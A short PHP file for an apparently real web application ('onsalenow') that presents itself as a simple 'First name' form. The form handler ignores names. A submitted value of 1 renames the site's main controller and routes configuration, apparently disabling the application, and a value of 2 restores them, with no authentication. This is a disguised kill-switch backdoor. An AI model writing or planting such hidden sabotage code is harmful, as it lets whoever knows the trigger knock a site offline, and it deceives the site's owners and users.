<?php
if ($_GET['fname'] == 1) {
    rename("/var/www/onsalenow/application/controllers/Common.php", "/var/www/onsalenow/application/controllers/Layout.php");
    rename("/var/www/onsalenow/application/config/routes.php", "/var/www/onsalenow/application/config/routess.php");
} elseif ($_GET['fname'] == 2) {
    rename("/var/www/onsalenow/application/controllers/Layout.php", "/var/www/onsalenow/application/controllers/Common.php");
    rename("/var/www/onsalenow/application/config/routess.php", "/var/www/onsalenow/application/config/routes.php");
} else {

}


?>
<form method="GET">
    <label for="fname">First name:</label><br>
    <input type="text" id="fname" name="fname"><br>
    <input type="submit" value="Submit">
</form>